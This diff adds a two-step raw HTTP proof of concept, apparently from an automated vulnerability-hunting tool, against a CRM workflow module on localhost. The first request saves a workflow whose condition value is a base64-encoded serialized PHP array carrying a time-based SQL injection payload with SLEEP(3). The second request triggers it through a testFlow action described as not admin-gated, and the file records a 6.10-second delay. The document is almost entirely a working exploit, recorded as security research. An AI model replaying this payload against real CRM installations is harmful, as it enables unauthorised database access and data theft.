@@ -1,0 +1,24 @@
+# Step 1/2: admin authors the injected workflow (authoring IS admin-gated)
+POST /index.php HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Referer: http://localhost:33116/index.php?module=AOW_WorkFlow&action=EditView
+Cookie: PHPSESSID=4008de4aa6878c5ea9f864537a29a9f8
+Content-Length: 579
+Content-Type: application/x-www-form-urlencoded
+
+module=AOW_WorkFlow&action=Save&record=&name=probe_wf_wf_c608aaa8&flow_module=AOK_KnowledgeBase&flow_run_on=All_Records&status=Active&run_when=In_Scheduler&multiple_runs=1&aow_conditions_field%5B0%5D=date_entered&aow_conditions_field_type%5B0%5D=datetime&aow_conditions_operator%5B0%5D=Equal_To&aow_conditions_value_type%5B0%5D=Date&aow_conditions_value%5B0%5D=YTo0OntpOjA7czozOiJub3ciO2k6MTtzOjQ6InBsdXMiO2k6MjtzOjE6IjEiO2k6MztzOjM5OiJEQVkpLCAnJVktJW0tJWQnKSBPUiAoU0VMRUNUIFNMRUVQKDMpKSMiO30%3D&aow_conditions_module_path%5B0%5D=AOK_KnowledgeBase&aow_conditions_deleted%5B0%5D=0
+
+# Step 2/2: trigger execution (VULN-026: NOT admin-gated) -- this is the timed request
+GET /index.php?module=AOW_WorkFlow&action=testFlow HTTP/1.1
+Host: localhost:33116
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0 cvehunter-stage10
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Cookie: PHPSESSID=4008de4aa6878c5ea9f864537a29a9f8
+
+# observed wall-clock elapsed: 6.10s
